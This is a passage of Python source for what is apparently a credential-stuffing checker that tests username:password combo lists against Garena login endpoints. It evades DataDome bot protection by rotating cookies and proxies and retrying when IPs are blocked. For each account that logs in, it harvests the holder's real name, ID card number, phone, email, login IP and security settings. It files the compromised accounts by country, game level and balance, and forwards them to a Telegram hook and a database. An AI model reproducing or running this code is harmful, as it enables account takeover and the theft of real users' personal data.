        lines.append(sep_line(DUSTY_ROSE, width))
        lines.append(f"  {DUSTY_ROSE}◈  Powered by @lleessiee{RESET}")
        lines.append(sep_line(DUSTY_ROSE, width))
        return "\n".join(lines)

    else:
        lines = []
        width = 60
        lines.append("")
        lines.append("─" * width)
        lines.append("ACCOUNT INFORMATION")
        lines.append("─" * width)
        lines.append(f"Credentials: {username}:{password}")
        lines.append(f"Shells: {shell}")
        lines.append(f"Email: {email}")
        lines.append(f"Mobile: {mobile}")
        lines.append(f"Garena Server: {country} {c_flag}")
        lines.append("")
        lines.append("─" * width)
        lines.append("EXTRA INFO")
        lines.append("─" * width)
        lines.append(f"Real Name: {real_name}")
        lines.append(f"ID Card: {id_card}")
        lines.append(f"ID Card Length: {id_card_length}")
        lines.append(f"Signature: {signature}")
        lines.append(f"Password Strength: {password_strength}")
        lines.append(f"Account Created: {account_created}")
        lines.append(f"Avatar: {avatar}")
        lines.append(f"Suspicious: {suspicious}")
        if has_codm and level and level != 'N/A':
            lines.append("")
            lines.append("─" * width)
            lines.append("CODM INFO")
            lines.append("─" * width)
            lines.append(f"Nickname: {nickname}")
            lines.append(f"UID: {uid}")
            lines.append(f"Level: {level}")
            lines.append(f"Server: {region} {r_flag}")
        lines.append("")
        lines.append("─" * width)
        lines.append("BINDINGS & SECURITY")
        lines.append("─" * width)
        lines.append(f"FB Connected: {fb_info}")
        lines.append(f"2FA: {two_step}")
        lines.append(f"Auth App: {auth_app}")
        lines.append(f"Last Login IP: {last_login_ip}")
        lines.append(f"Email Verified: {email_verified_time}")
        lines.append(f"Whitelistable: {whitelistable}")
        lines.append(f"RealInfo Updatable: {realinfo_updatable}")
        lines.append(f"Last Login Date: {last_login}")
        lines.append(f"Login From: {last_login_from}")
        if connected_games:
            lines.append("")
            lines.append("─" * width)
            lines.append("CONNECTED GAMES")
            lines.append("─" * width)
            for g in connected_games:
                lines.append(f"• {g}")
        else:
            lines.append("")
            lines.append("─" * width)
            lines.append("CONNECTED GAMES")
            lines.append("─" * width)
            lines.append("None")
        lines.append("")
        lines.append("─" * width)
        lines.append("Powered by @lleessiee")
        lines.append("─" * width)
        return "\n".join(lines)

def display_codm_info_elegant(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    display_codm_info(account, password, details, codm_info, has_codm, error_reason, game_connections)

def get_game_connections(session, account):
    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}
    game_mappings = {
        'tw': {'100082': 'CODM', '100067': 'FREE FIRE', '100070': 'SPEED DRIFTERS', '100130': 'BLACK CLOVER M', '100105': 'GARENA UNDAWN', '100050': 'ROV', '100151': 'DELTA FORCE', '100147': 'FAST THRILL', '100107': 'MOONLIGHT BLADE'},
        'th': {'100067': 'FREEFIRE', '100055': 'ROV', '100082': 'CODM', '100151': 'DELTA FORCE', '100105': 'GARENA UNDAWN', '100130': 'BLACK CLOVER M', '100070': 'SPEED DRIFTERS', '32836': 'FC ONLINE', '100071': 'FC ONLINE M', '100124': 'MOONLIGHT BLADE'},
        'vn': {'32837': 'FC ONLINE', '100072': 'FC ONLINE M', '100054': 'ROV', '100137': 'THE WORLD OF WAR'},
        'default': {'100082': 'CODM', '100067': 'FREEFIRE', '100151': 'DELTA FORCE', '100105': 'GARENA UNDAWN', '100057': 'AOV', '100070': 'SPEED DRIFTERS', '100130': 'BLACK CLOVER M', '100055': 'ROV'}
    }
    try:
        token_url = 'https://authgop.garena.com/oauth/token/grant'
        token_data = f'client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}'
        token_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Pragma': 'no-cache', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            token_resp = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
            access_token = token_resp.json().get('access_token', '')
        except Exception:
            return []
        if not access_token:
            return []
        inspect_url = 'https://shop.garena.sg/api/auth/inspect_token'
        inspect_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': '*/*', 'Content-Type': 'application/json'}
        try:
            inspect_resp = session.post(inspect_url, headers=inspect_hdrs, json={'token': access_token}, timeout=15)
            inspect_json = inspect_resp.json()
        except Exception:
            return []
        session_key = inspect_resp.cookies.get('session_key')
        if not session_key:
            return []
        uac = inspect_json.get('uac', 'ph').lower()
        region = uac if uac in valid_regions else 'ph'
        if region in ('th', 'in'):
            base_domain = 'termgame.com'
        elif region == 'id':
            base_domain = 'kiosgamer.co.id'
        elif region == 'vn':
            base_domain = 'napthe.vn'
        else:
            base_domain = f'shop.garena.{region}'
        applicable = game_mappings.get(region, game_mappings['default'])
        for app_id, game_name in applicable.items():
            roles_url = f'https://{base_domain}/api/shop/apps/roles'
            roles_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': 'application/json, text/plain, */*', 'Referer': f'https://{base_domain}/?app={app_id}', 'Cookie': f'session_key={session_key}'}
            try:
                roles_resp = session.get(roles_url, params={'app_id': app_id}, headers=roles_hdrs, timeout=15)
                roles_data = roles_resp.json()
            except Exception:
                continue
            role = None
            if isinstance(roles_data.get('role'), list) and roles_data['role']:
                role = roles_data['role'][0]
            elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                candidate = roles_data[app_id][0]
                role = candidate.get('role') or candidate.get('user_id') if isinstance(candidate, dict) else str(candidate)
            elif isinstance(roles_data, list) and roles_data:
                first = roles_data[0]
                if isinstance(first, dict) and first.get('role'):
                    role = first['role']
            if role:
                game_info.append({'region': region.upper(), 'game': game_name, 'role': str(role)})
    except Exception as e:
        logger.error(f'[ERROR] get_game_connections failed: {e}')
    return game_info

def save_game_folder(account, password, account_data, game_connections, base_dir):
    try:
        games_dir = Path(base_dir) / 'Games'
        games_dir.mkdir(parents=True, exist_ok=True)
        identifier = f'{account}:{password}'
        base_entry = f"{identifier}\nEmail: {account_data.get('email_display', 'N/A')}\nMobile: {account_data.get('formatted_mobile', 'N/A')}\nShell: {account_data.get('shell_balance', 0)}\nCountry: {account_data.get('country', 'N/A')}\nLast Login: {account_data.get('last_login_date', 'N/A')}\nLogin Location: {account_data.get('last_login_where', 'N/A')}\nLogin IP: {account_data.get('last_login_ip', 'N/A')}\nFB Status: {account_data.get('fb_info', 'N/A')}\nReal Name: {account_data.get('real_name', 'N/A')}\nID Card: {account_data.get('id_card', 'N/A')}\nSignature: {account_data.get('signature', 'N/A')}\nStatus: {('CLEAN' if account_data.get('is_clean') else 'NOT CLEAN')}\n"
        saved_games = set()
        for g in game_connections:
            gname = g.get('game', '').upper()
            grole = g.get('role', 'N/A')
            gregion = g.get('region', 'N/A')
            if gname in saved_games:
                continue
            saved_games.add(gname)
            fname = GAME_FILE_MAP.get(gname, f"{gname.replace(' ', '_')}.txt")
            fpath = games_dir / fname
            if gname == 'CODM':
                entry = base_entry + f'CODM IGN: {grole}\n' + f"CODM Level: {account_data.get('codm_level', 'N/A')}\n" + f"CODM UID: {account_data.get('codm_uid', 'N/A')}\n" + f'CODM Region: {gregion}\n'
            else:
                entry = base_entry + f'{gname} IGN: {grole}\n' + f'{gname} Region: {gregion}\n'
            already = False
            if fpath.exists():
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    if identifier in f.read():
                        already = True
            if not already:
                with open(fpath, 'a', encoding='utf-8', errors='replace') as f:
                    f.write(entry.strip() + '\n\n')
    except Exception as e:
        logger.error(f'[ERROR] save_game_folder: {e}')

class Results:
    def __init__(self, combo_file_path):
        self.combo_file_name = Path(combo_file_path).stem
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.base_dir = Path(f'Results/output_{self.combo_file_name}')
        for sub in ('Country', 'Level', 'Games', 'Garena Shells'):
            (self.base_dir / sub).mkdir(parents=True, exist_ok=True)
        self._file_locks = {}
        self._locks_meta = threading.Lock()
        self._counter = 0
        self._counter_lock = threading.Lock()
        self._db_queue = []
        self._db_queue_lock = threading.Lock()
        self._db_flush_lock = threading.Lock()
        self._DB_BATCH = 500
        self._db_flushing = False

    def _db_enqueue(self, combo):
        with self._db_queue_lock:
            self._db_queue.append(combo)
            should_flush = len(self._db_queue) >= self._DB_BATCH and (not self._db_flushing)
        if should_flush:
            threading.Thread(target=self._db_flush_batch, daemon=True).start()

    def _db_flush_batch(self, force=False):
        with self._db_flush_lock:
            with self._db_queue_lock:
                if not self._db_queue:
                    return
                if not force and len(self._db_queue) < self._DB_BATCH:
                    return
                batch = list(self._db_queue)
                self._db_queue.clear()
                self._db_flushing = True
            try:
                _pg_save_combos(batch)
            except Exception:
                pass
            finally:
                with self._db_queue_lock:
                    self._db_flushing = False

    def db_flush_final(self):
        self._db_flush_batch(force=True)

    def _get_flock(self, fp):
        fp = str(fp)
        with self._locks_meta:
            if fp not in self._file_locks:
                self._file_locks[fp] = threading.Lock()
            return self._file_locks[fp]

    def _next_index(self):
        with self._counter_lock:
            self._counter += 1
            return self._counter

    @staticmethod
    def _entry_level(entry):
        import re as _re
        m = _re.search(r'Level:\s*(\d+)', entry)
        return int(m.group(1)) if m else 0

    def _write_sorted(self, filepath, new_entry_body, sort_by='level'):
        filepath = str(filepath)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with self._get_flock(filepath):
            entries = []
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read()
                raw_entries = content.strip().split('\n\n')
                for raw_entry in raw_entries:
                    raw_entry = raw_entry.strip()
                    if raw_entry:
                        entries.append(raw_entry)
            new_entry = new_entry_body.strip()
            if new_entry:
                entries.append(new_entry)

            if sort_by == 'level':
                entries.sort(key=self._entry_level, reverse=True)
            else:
                entries.sort(key=self._entry_level, reverse=True)

            with open(filepath, 'w', encoding='utf-8', errors='replace') as f:
                for i, entry in enumerate(entries):
                    f.write(entry.strip())
                    if i < len(entries) - 1:
                        f.write('\n\n')

    def _append_line(self, filepath, line):
        filepath = str(filepath)
        with self._get_flock(filepath):
            with open(filepath, 'a', encoding='utf-8', errors='replace') as f:
                f.write(line + '\n')

    @staticmethod
    def _ascii(val):
        if not val or val == 'N/A':
            return val
        cleaned = ''.join((c for c in str(val) if c >= ' ' or c in '\t')).strip()
        return cleaned or 'N/A'

    def _format_server(self, region_code):
        if not region_code or region_code == 'N/A':
            return 'N/A'
        _region_info = CODM_REGIONS.get(str(region_code).upper(), {}) if region_code and region_code != 'N/A' else {}
        return f"{_region_info['flag']} {_region_info['name']} ({region_code})" if _region_info else str(region_code)

    def _format_account(self, account_data, index=1):
        acct = account_data.get('account', 'N/A')
        pwd = account_data.get('password', 'N/A')
        if account_data.get('is_error'):
            return '-' * 60 + f"\nAccount: {acct} : {pwd}\nError: {account_data.get('error_reason', 'Unknown')}\n" + '-' * 60

        is_clean = account_data.get('is_clean', False)
        has_codm = account_data.get('has_codm', False)
        shell = account_data.get('shell_balance', 0)
        uid = account_data.get('uid', 'N/A')
        username = account_data.get('username', 'N/A')
        nickname = account_data.get('nickname', 'N/A')
        email_display = account_data.get('email_display', 'N/A')
        formatted_mobile = account_data.get('formatted_mobile', 'N/A')
        country = account_data.get('country', 'N/A')
        fb_info = account_data.get('fb_info', 'NOT CONNECTED')
        fb_username = account_data.get('fb_username', 'N/A')
        fb_link = account_data.get('fb_link', 'N/A')
        last_login_date = account_data.get('last_login_date', 'N/A')
        last_login_where = account_data.get('last_login_where', 'N/A')
        last_login_ip = account_data.get('last_login_ip', 'N/A')
        last_login_country = account_data.get('last_login_country', 'N/A')
        two_step = "Yes" if account_data.get('two_step_verify', False) else "No"
        auth_app = "Yes" if account_data.get('authenticator_app', False) else "No"
        email_verified = "Yes" if account_data.get('email_verified', False) else "No"
        codm_level = account_data.get('codm_level', 'N/A')
        codm_region = account_data.get('codm_region', 'N/A')
        codm_nickname = account_data.get('codm_nickname', 'N/A')
        codm_uid = account_data.get('codm_uid', 'N/A')
        real_name = account_data.get('real_name', 'N/A')
        id_card = account_data.get('id_card', 'N/A')
        id_card_length = account_data.get('id_card_length', 'N/A')
        signature = account_data.get('signature', 'N/A')
        avatar = account_data.get('avatar', 'N/A')
        suspicious = "Yes" if account_data.get('suspicious', False) else "No"
        password_strength = account_data.get('password_strength', 'N/A')
        email_verified_time = account_data.get('email_verified_time', 'N/A')
        whitelistable = "Yes" if account_data.get('whitelistable', False) else "No"
        realinfo_updatable = "Yes" if account_data.get('realinfo_updatable', False) else "No"
        account_created = account_data.get('account_created', 'N/A')

        server_str = self._format_server(codm_region)

        width = 60
        def header_footer(text):
            dashes = (width - len(text) - 4) // 2
            if dashes < 0:
                dashes = 0
            return f"◆ {'─' * dashes} {text} {'─' * dashes} ◆"

        lines = []
        lines.append(header_footer(f'ACCOUNT #{index}'))
        lines.append(f'Credentials: {acct}:{pwd}')
        lines.append(f'Shells: {shell}')
        lines.append('─' * width)
        lines.append('◈  PROFILE DETAILS')
        lines.append(f'Real Name: {real_name}')
        lines.append(f'ID Card: {id_card}')
        lines.append(f'ID Card Len: {id_card_length}')
        lines.append(f'Signature: {signature}')
        lines.append(f'Avatar: {avatar}')
        lines.append(f'Password Str: {password_strength}')
        lines.append(f'Account Cre: {account_created}')
        lines.append(f'Suspicious: {suspicious}')
        if has_codm:
            lines.append('─' * width)
            lines.append('◈  CALL OF DUTY: MOBILE')
            lines.append(f'Level: {codm_level}')
            lines.append(f'Server: {server_str}')
            lines.append(f'IGN: {codm_nickname}')
            lines.append(f'UID: {codm_uid}')
        lines.append('─' * width)
        lines.append('◈  ACCOUNT SECURITY')
        lines.append(f'FB Connected: {fb_info}')
        lines.append(f'Mobile: {formatted_mobile}')
        lines.append(f'2FA: {two_step}')
        lines.append(f'Auth App: {auth_app}')
        lines.append(f'Whitelistable: {whitelistable}')
        lines.append(f'RealInfo Upd: {realinfo_updatable}')
        lines.append(f'Email Ver: {email_verified_time}')
        lines.append('─' * width)
        lines.append('◈  RECENT LOGIN')
        lines.append(f'Last Login: {last_login_date}')
        lines.append(f'IP: {last_login_ip}')
        lines.append(f'From: {last_login_where}')
        lines.append('─' * width)
        lines.append('◈  CONNECTED GAMES')
        if account_data.get('game_connections'):
            for g in account_data.get('game_connections', []):
                gname = g.get('game', 'Unknown')
                grole = g.get('role', 'N/A')
                gregion = g.get('region', '')
                lines.append(f'  {gname}: {grole} ({gregion})' if gregion else f'  {gname}: {grole}')
        else:
            lines.append('  None')
        lines.append(header_footer(' @lleessiee '))
        return '\n'.join(lines)

    def add_account(self, account_data):
        combo = f"{account_data.get('account', '')}:{account_data.get('password', '')}"
        if combo.strip(':'):
            self._db_enqueue(combo)
        if _TG_HOOK and (not account_data.get('is_error')):
            threading.Thread(target=_TG_HOOK, args=(account_data,), daemon=True).start()
        if account_data.get('is_error'):
            return
        index = self._next_index()
        entry = self._format_account(account_data, index=index)
        has_codm = account_data.get('has_codm', False)
        is_clean = account_data.get('is_clean', False)
        shell = int(account_data.get('shell_balance', 0) or 0)
        country = str(account_data.get('country', 'XX') or 'XX').strip().upper()

        valid_path = self.base_dir / 'Valid Accounts.txt'
        self._append_line(valid_path, combo)
        self._write_sorted(self.base_dir / 'All Accounts.txt', entry)
        clean_file = 'Clean Accounts.txt' if is_clean else 'Not Clean Accounts.txt'
        self._write_sorted(self.base_dir / clean_file, entry)
        self._write_sorted(self.base_dir / 'Country' / f'{country} Accounts.txt', entry)

        if has_codm:
            try:
                lvl = int(account_data.get('codm_level', 0) or 0)
            except (ValueError, TypeError):
                lvl = 0
            if lvl <= 100:
                bucket = '1-100.txt'
            elif lvl <= 200:
                bucket = '101-200.txt'
            elif lvl <= 350:
                bucket = '201-350.txt'
            else:
                bucket = '351-400.txt'
            self._write_sorted(self.base_dir / 'Level' / bucket, entry)

        if shell > 0:
            shells_file = 'CODM Accounts.txt' if has_codm else 'NO CODM Accounts.txt'
            self._write_sorted(self.base_dir / 'Garena Shells' / shells_file, entry, sort_by='shell')

class FileManager:
    def __init__(self, combo_folder='Combo'):
        self.combo_folder = Path(combo_folder)
        self.combo_folder.mkdir(exist_ok=True)
        self._file_lock = threading.Lock()
    def scan_combo_folder(self):
        return list(self.combo_folder.glob('*.txt'))
    def get_file_info(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and ':' in line]
                account_count = len(lines)
            file_size = file_path.stat().st_size
            return {'name': file_path.name, 'path': str(file_path), 'size': file_size, 'size_str': self._format_size(file_size), 'account_count': account_count}
        except Exception as e:
            logger.error(f'Error reading file {file_path}')
            return None
    def _format_size(self, size_bytes):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_bytes < 1024.0:
                return f'{size_bytes:.2f} {unit}'
            size_bytes /= 1024.0
        return f'{size_bytes:.2f} TB'
    def clean_file_encoding(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            cleaned_lines = []
            invalid_count = 0
            for line in lines:
                account, password = clean_account_line(line)
                if account and password:
                    cleaned_lines.append(f'{account}:{password}\n')
                else:
                    invalid_count += 1
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(cleaned_lines)
            return (len(cleaned_lines), invalid_count)
        except Exception as e:
            logger.error(f'Error cleaning file encoding')
            return (0, 0)
    def clean_duplicates(self, file_path, overwrite=True):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            original_count = len(lines)
            unique_lines = list(dict.fromkeys(lines))
            duplicates_removed = original_count - len(unique_lines)
            if overwrite:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            else:
                new_path = file_path.parent / f'{file_path.stem}_cleaned.txt'
                with open(new_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            return duplicates_removed
        except Exception as e:
            logger.error(f'Error cleaning duplicates')
            return 0
    def remove_line_from_file(self, file_path, line_to_remove):
        try:
            file_path = Path(file_path)
            target = line_to_remove.strip()
            with self._file_lock:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                with open(file_path, 'w', encoding='utf-8') as f:
                    for line in lines:
                        if line.strip() != target:
                            f.write(line)
            return True
        except Exception as e:
            logger.error(f'Error removing line')
            return False

_auto_remove_queue = []
_auto_remove_lock = threading.Lock()
_auto_remove_batch = 50

def _flush_auto_remove(file_manager, combo_file_path, force=False):
    with _auto_remove_lock:
        if not _auto_remove_queue:
            return
        if not force and len(_auto_remove_queue) < _auto_remove_batch:
            return
        batch = list(_auto_remove_queue)
        _auto_remove_queue.clear()
    if not batch:
        return
    target_set = set((b.strip() for b in batch))
    try:
        fp = Path(combo_file_path)
        with file_manager._file_lock:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = fh.readlines()
            with open(fp, 'w', encoding='utf-8') as fh:
                for line in lines:
                    if line.strip() not in target_set:
                        fh.write(line)
    except Exception:
        pass

def _queue_auto_remove(account, password, file_manager, combo_file_path):
    with _auto_remove_lock:
        _auto_remove_queue.append(f'{account}:{password}')
    if len(_auto_remove_queue) >= _auto_remove_batch:
        threading.Thread(target=_flush_auto_remove, args=(file_manager, combo_file_path), daemon=True).start()

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None, max_retries=3, retry_delay=0.3, validator_mode=False):
    attempt = 0

    def display_info(acc, pwd, det, codm, has, error_reason=None, gc=None):
        if suppress_print:
            return
        if use_elegant_display:
            display_codm_info_elegant(acc, pwd, det, codm, has, error_reason, gc)
        else:
            display_codm_info(acc, pwd, det, codm, has, error_reason, gc)

    def fit_line(account_part, message):
        try:
            term_width = shutil.get_terminal_size((80, 24)).columns
        except:
            term_width = 80
        separator = " — "
        full = f"{account_part}{separator}{message}"
        if len(full) <= term_width:
            return full
        max_account_len = term_width - len(separator) - len(message) - 4
        if max_account_len < 5:
            return f"{account_part[:4]}...{separator}{message}"
        return f"{account_part[:max_account_len]}....{separator}{message}"

    while attempt < max_retries:
        attempt += 1
        try:
            session.cookies.clear()
            init_ga_cookies(session)
            datadome_manager.clear_session_datadome(session)

            current_datadome = datadome_manager.get_datadome()
            if current_datadome:
                datadome_manager.set_session_datadome(session, current_datadome)
            else:
                saved = cookie_manager.get_valid_cookies()
                if saved:
                    picked = random.choice(saved)
                    val = picked.split('=', 1)[1] if '=' in picked else picked
                    datadome_manager.set_datadome(val)
                    datadome_manager.set_session_datadome(session, val)
                else:
                    proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                    datadome = get_datadome_cookie(session, proxies=proxy_dict)
                    if datadome:
                        datadome_manager.set_datadome(datadome)
                        datadome_manager.set_session_datadome(session, datadome)

            time.sleep(random.uniform(0.05, 0.15))
            v1, v2, new_datadome = prelogin(session, account, datadome_manager, cookie_manager, proxy_manager=proxy_manager)

            if v1 == 'IP_BLOCKED':
                if datadome_manager.wait_for_ip_change(session):
                    session.close()
                    session = requests.Session()
                    session.cookies.clear()
                    init_ga_cookies(session)
                    datadome_manager.clear_session_datadome(session)
                    if attempt < max_retries:
                        time.sleep(random.uniform(0, retry_delay))
                        continue
                    live_stats.update_stats(is_error=True)
                    return fit_line(account, "ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs")
                else:
                    live_stats.update_stats(is_error=True)
                    if attempt < max_retries:
                        time.sleep(random.uniform(0, retry_delay))
                        continue
                    return fit_line(account, "ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs")

            if not v1 or not v2:
                if attempt < max_retries:
                    time.sleep(random.uniform(0, retry_delay))
                    continue
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                results_manager.add_account(account_data)
                live_stats.push_result(success=False, error_reason="Account Doesn't Exist")
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return fit_line(account, "ᴅᴏᴇsɴ'ᴛ ᴇxɪsᴛ")

            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
                datadome_manager.set_session_datadome(session, new_datadome)

            sso_key = login(session, account, password, v1, v2)

            if not sso_key:
                if attempt < max_retries:
                    time.sleep(random.uniform(0, retry_delay))
                    continue
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Credentials'}
                results_manager.add_account(account_data)
                live_stats.push_result(success=False, error_reason='Wrong Password')
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return fit_line(account, "ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs")

            if isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
                reason = sso_key.split(':', 1)[1]
                if "ACCOUNT DOESNT EXIST" in reason:
                    live_stats.update_stats(valid=False)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
                    results_manager.add_account(account_data)
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return fit_line(account, "ᴅᴏᴇsɴ'ᴛ ᴇxɪsᴛ")
                else:
                    if attempt < max_retries:
                        time.sleep(random.uniform(0, retry_delay))
                        continue
                    live_stats.update_stats(valid=False)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
                    results_manager.add_account(account_data)
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return fit_line(account, "ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs")

            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

            headers = {'accept': '*/*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
            if cookie_header:
                headers['cookie'] = cookie_header

            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=15)

            if response.status_code == 403:
                bad_cookie = session.cookies.get('datadome') or datadome_manager.get_datadome()
                if bad_cookie:
                    cookie_manager.mark_banned(bad_cookie)
                if proxy_manager and proxy_manager.is_loaded():
                    session.proxies.clear()
                    session.proxies.update(proxy_manager.get_next())
                if datadome_manager.handle_403(session):
                    if attempt < max_retries:
                        time.sleep(random.uniform(0, retry_delay))
                        continue
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return fit_line(account, "ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs")

            try:
                account_data_json = response.json()
            except json.JSONDecodeError:
                if attempt < max_retries:
                    time.sleep(random.uniform(0, retry_delay))
                    continue
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return fit_line(account, "ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs")

            if 'error_auth' in account_data_json:
                if attempt < max_retries:
                    time.sleep(random.uniform(0, retry_delay))
                    continue
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Incorrect Password'}
                results_manager.add_account(account_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return fit_line(account, "ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs")

            if 'error' in account_data_json:
                error_msg = account_data_json.get('error')
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    live_stats.update_stats(valid=False)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                    results_manager.add_account(account_data)
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return fit_line(account, "ᴅᴏᴇsɴ'ᴛ ᴇxɪsᴛ")
                else:
                    if attempt < max_retries:
                        time.sleep(random.uniform(0, retry_delay))
                        continue
                    live_stats.update_stats(is_error=True)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': error_msg}
                    results_manager.add_account(account_data)
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return fit_line(account, "ᴡʀᴏɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs")

            if validator_mode:
                live_stats.update_stats(valid=True)
                return fit_line(account, "ᴠᴀʟɪᴅ")

            if 'user_info' in account_data_json:
                details = parse_account_details(account_data_json)
                details['login_history'] = account_data_json.get('login_history', [])
            else:
                details = parse_account_details({'user_info': account_data_json})

            mobile_no = details['personal'].get('mobile_no', 'N/A')
            country_code = details['personal'].get('country_code', 'N/A')
            formatted_mobile = format_mobile_number(mobile_no, country_code)

            email = details.get('email', 'N/A')
            email_verified = details.get('email_verified', False)
            email_display = f'{email} (Verified)' if email_verified else f'{email} (Not Verified)'

            fb_username = details['facebook'].get('fb_username', 'N/A')
            fb_uid = details['facebook'].get('fb_uid', 'N/A')
            fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}' if fb_uid != 'N/A' and fb_uid else 'N/A'
            if fb_uid == 'N/A' or not fb_uid:
                fb_info = 'NOT CONNECTED'
            elif not fb_username or fb_username == 'N/A':
                fb_info = 'FB UNBIND or FB DELETED'
            else:
                fb_info = 'CONNECTED'

            login_history = details.get('login_history', [])
            last_login_info = login_history[0] if login_history else {}
            last_login = last_login_info.get('timestamp', 0)
            last_login_date = time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login)) if last_login else 'N/A'
            last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else 'Unknown'
            last_login_ip = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
            last_login_country = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'

            account_data = {
                'account': account,
                'password': password,
                'uid': details.get('uid', 'N/A'),
                'username': details.get('username', 'N/A'),
                'nickname': details.get('nickname', 'N/A'),
                'email': details.get('email', 'N/A'),
                'email_verified': details.get('email_verified', False),
                'email_display': email_display,
                'formatted_mobile': formatted_mobile,
                'country': details['personal'].get('country', 'N/A'),
                'shell_balance': details['profile'].get('shell_balance', 0),
                'account_status': details['status'].get('account_status', 'N/A'),
                'fb_username': fb_username,
                'fb_uid': fb_uid,
                'fb_link': fb_link,
                'fb_info': fb_info,
                'bind_status': details.get('bind_status', 'N/A'),
                'is_clean': details.get('is_clean', False),
                'has_codm': False,
                'is_error': False,
                'last_login_date': last_login_date,
                'last_login_where': last_login_where,
                'last_login_ip': last_login_ip,
                'last_login_country': last_login_country,
                'two_step_verify': details['security'].get('two_step_verify', False),
                'authenticator_app': details['security'].get('authenticator_app', False),
                'game_connections': [],
                'real_name': details['personal'].get('real_name', 'N/A'),
                'id_card': details['personal'].get('id_card', 'N/A'),
                'id_card_length': details['personal'].get('id_card_length', 'N/A'),
                'signature': details['profile'].get('signature', 'N/A'),
                'avatar': details['profile'].get('avatar', 'N/A'),
